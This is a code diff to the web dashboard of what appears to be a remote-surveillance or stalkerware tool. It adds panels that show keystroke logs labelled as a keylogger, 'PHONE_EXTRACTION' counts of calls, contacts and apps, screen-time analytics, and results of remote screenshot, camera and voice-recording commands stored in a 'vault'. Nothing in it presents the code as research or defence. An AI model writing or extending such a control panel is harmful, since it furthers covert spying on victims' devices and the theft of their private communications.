@@ -621,8 +621,47 @@
 
                     // MODULE: VITALS
                     if (d.battery_level !== undefined) {
-                        dataHtml += `<div style="margin-top:10px; color:#888; font-size:0.65rem;">
+                        dataHtml += `<div style="margin-top:10px; color:#888; font-size:0.65rem; border-top:1px solid #222; padding-top:5px;">
                             ⚡ BATT: ${d.battery_level}% | 📶 ONLINE: ${d.online_time_minutes || 0}m
+                        </div>`;
+                    }
+
+                    // MODULE: USAGE / TIMELINE
+                    if (d.screen_time_minutes !== undefined || d.app_usage_timeline) {
+                        dataHtml += `<div style="margin-top:10px; padding:10px; background:rgba(245,158,11,0.1); border:1px solid #f59e0b;">
+                            <div style="color:#f59e0b; font-size:0.7rem; font-weight:bold;">📈 USAGE_ANALYTICS</div>
+                            <div style="font-size:0.8rem; margin:5px 0;">Screen Time: ${d.screen_time_minutes || 0}m</div>
+                            <div style="font-size:0.65rem; color:#888;">App Switches: ${d.summary_stats?.app_switch_count || 0}</div>
+                        </div>`;
+                    }
+
+                    // MODULE: TYPING / KEYLOGGER
+                    if (d.typing_history || d.summary_stats?.typing_chars) {
+                        dataHtml += `<div style="margin-top:10px; padding:10px; background:rgba(236,72,153,0.1); border:1px solid #ec4899;">
+                            <div style="color:#ec4899; font-size:0.7rem; font-weight:bold;">⌨️ KEYSTROKE_LOGS</div>
+                            <div style="font-size:0.8rem; margin:5px 0;">Chars Captured: ${d.summary_stats?.typing_chars || 0}</div>
+                            <div style="font-size:0.65rem; color:#888;">Avg Speed: ${d.summary_stats?.typing_wpm || 0} WPM</div>
+                        </div>`;
+                    }
+
+                    // MODULE: PHONE / CALLS / CONTACTS
+                    if (d.calls || d.contacts || d.apps) {
+                        dataHtml += `<div style="margin-top:10px; padding:10px; background:rgba(59,130,246,0.1); border:1px solid #3b82f6;">
+                            <div style="color:#3b82f6; font-size:0.7rem; font-weight:bold;">📱 PHONE_EXTRACTION</div>
+                            <div style="font-size:0.75rem; margin-top:4px;">
+                                ${d.calls ? `📞 Calls: ${d.calls.length} ` : ''}
+                                ${d.contacts ? `👥 Contacts: ${d.contacts.length} ` : ''}
+                                ${d.apps ? `📦 Apps: ${d.apps.length}` : ''}
+                            </div>
+                        </div>`;
+                    }
+
+                    // MODULE: MEDIA / SCREENSHOT / VOICE / IMAGE
+                    if (type === 'GET_SCREENSHOT' || type === 'CAPTURE_IMAGE' || type === 'RECORD_VOICE' || c.result_file_path?.includes('PULL')) {
+                        dataHtml += `<div style="margin-top:10px; padding:10px; background:rgba(255,255,255,0.05); border:1px solid #555;">
+                            <div style="color:#fff; font-size:0.7rem; font-weight:bold;">📸 MEDIA_READY</div>
+                            <div style="font-size:0.75rem; color:#aaa; margin:5px 0;">${c.result_file_path ? c.result_file_path.split('/').pop() : 'Processing capture...'}</div>
+                            <div onclick="switchTab('files')" style="color:var(--primary); cursor:pointer; font-size:0.7rem; text-decoration:underline;">OPEN IN VAULT</div>
                         </div>`;
                     }
                 }
